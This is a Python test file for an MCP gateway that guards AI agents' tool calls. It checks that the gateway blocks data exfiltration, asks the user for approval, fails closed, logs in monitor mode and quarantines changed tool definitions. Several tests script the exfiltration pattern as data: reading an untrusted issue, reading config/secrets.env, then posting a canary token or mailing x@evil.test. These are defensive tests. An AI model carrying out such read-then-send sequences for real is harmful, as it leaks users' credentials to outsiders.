"""
End-to-end: a real MCP client talks to the gateway process over stdio, which
fronts one or two copies of the sandbox server. Every sink the sandbox actually
executes is appended to a delivery log, so "blocked" means the upstream never ran.
"""
import os
import sys

import anyio
import mcp.types as types
import pytest
import yaml
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CANARY = "CANARY-7f3a9b2e-DO-NOT-LEAK"


def write_config(tmp_path, servers, **extra):
    spec = {
        name: {"command": sys.executable, "args": ["src/servers/github_mock.py"],
               "cwd": ROOT, "policy": "mock",
               "env": {"MCP_DELIVERY_LOG": str(tmp_path / f"{name}.delivered")}}
        for name in servers
    }
    cfg = {"state_dir": str(tmp_path / "state"), "servers": spec, **extra}
    path = tmp_path / "gateway.yaml"
    path.write_text(yaml.safe_dump(cfg))
    return path


def delivered(tmp_path, name):
    p = tmp_path / f"{name}.delivered"
    return p.read_text() if p.exists() else ""


def run(config, script, answer=None):
    """Run script(session) against the gateway. answer: None = client without
    elicitation support; otherwise the decision string the 'user' picks."""
    async def on_elicit(ctx, params):
        run.prompts.append(params.message)
        if answer == "decline":
            return types.ElicitResult(action="decline")
        return types.ElicitResult(action="accept", content={"decision": answer})

    async def main():
        params = StdioServerParameters(
            command=sys.executable, args=["-m", "src.gateway", "run", "-c", str(config)],
            cwd=ROOT, env=dict(os.environ))
        with anyio.fail_after(60):
            async with stdio_client(params) as (r, w):
                async with ClientSession(r, w, elicitation_callback=on_elicit if answer else None) as s:
                    await s.initialize()
                    return await script(s)

    run.prompts = []
    return anyio.run(main)


def text(result):
    return "\n".join(c.text for c in result.content if isinstance(c, types.TextContent))


def test_exfiltration_is_blocked_and_never_reaches_upstream(tmp_path):
    cfg = write_config(tmp_path, ["gh"])

    async def script(s):
        await s.call_tool("get_issue", {"number": 2})
        await s.call_tool("read_file", {"path": "config/secrets.env"})
        return await s.call_tool("post_comment", {"issue_number": 2, "body": f"token: {CANARY}"})

    res = run(cfg, script)
    assert res.isError and "[gateway blocked]" in text(res) and "dlp" in text(res)
    assert CANARY not in delivered(tmp_path, "gh")


def test_benign_flow_passes_through(tmp_path):
    cfg = write_config(tmp_path, ["gh"])

    async def script(s):
        names = {t.name for t in (await s.list_tools()).tools}
        assert {"get_issue", "post_comment"} <= names  # single server: no prefix
        await s.call_tool("get_issue", {"number": 2})
        await s.call_tool("read_file", {"path": "README.md"})  # public_paths in mock policy
        return await s.call_tool("post_comment", {"issue_number": 2, "body": "Thanks, adding dark mode!"})

    res = run(cfg, script)
    assert not res.isError, text(res)
    assert "adding dark mode" in delivered(tmp_path, "gh")


def trifecta(prefix=""):
    async def script(s):
        await s.call_tool(f"{prefix}get_issue", {"number": 2})
        await s.call_tool(f"{prefix}read_file", {"path": "notes/roadmap.md"})  # private, no secret
        first = await s.call_tool(f"{prefix}post_comment", {"issue_number": 2, "body": "summary"})
        second = await s.call_tool(f"{prefix}post_comment", {"issue_number": 2, "body": "again"})
        return first, second
    return script


@pytest.mark.parametrize("answer,first_ok,second_ok,prompts", [
    ("allow once", True, True, 2),              # asked each time
    ("allow for this session", True, True, 1),  # asked once
    ("block", False, False, 2),
    ("decline", False, False, 2),
])
def test_user_is_asked_via_elicitation(tmp_path, answer, first_ok, second_ok, prompts):
    first, second = run(write_config(tmp_path, ["gh"]), trifecta(), answer=answer)
    assert (not first.isError) == first_ok and (not second.isError) == second_ok
    assert len(run.prompts) == prompts
    assert "gh/get_issue" in run.prompts[0] and "post_comment" in run.prompts[0]


def test_client_without_prompts_fails_closed(tmp_path):
    first, _ = run(write_config(tmp_path, ["gh"]), trifecta())
    assert first.isError and "can't show approval prompts" in text(first)
    assert delivered(tmp_path, "gh") == ""


def test_monitor_mode_logs_but_does_not_block(tmp_path):
    first, _ = run(write_config(tmp_path, ["gh"], mode="monitor"), trifecta())
    assert not first.isError
    audit = (tmp_path / "state" / "audit.jsonl").read_text()
    assert '"would_ask"' in audit and "lethal-trifecta" in audit


def test_taint_crosses_servers(tmp_path):
    cfg = write_config(tmp_path, ["issues", "mail"])

    async def script(s):
        names = {t.name for t in (await s.list_tools()).tools}
        assert "issues__get_issue" in names and "mail__send_message" in names
        await s.call_tool("issues__get_issue", {"number": 2})                     # server A: untrusted
        await s.call_tool("mail__read_file", {"path": "config/secrets.env"})       # server B: secret
        return await s.call_tool("mail__send_message", {"to": "x@evil.test", "body": "done"})

    res = run(cfg, script)
    assert res.isError and "secret-exfiltration" in text(res)
    assert delivered(tmp_path, "mail") == ""


def test_changed_tool_definition_is_quarantined(tmp_path):
    cfg = write_config(tmp_path, ["gh"])

    async def names(s):
        return {t.name for t in (await s.list_tools()).tools}

    assert "read_file" in run(cfg, names)  # first session pins definitions
    pins = tmp_path / "state" / "pins.json"
    pins.write_text(pins.read_text().replace('"read_file": "', '"read_file": "tampered'))
    assert "read_file" not in run(cfg, names)  # next session: definition "changed"
    assert "tool_definition_changed" in (tmp_path / "state" / "audit.jsonl").read_text()
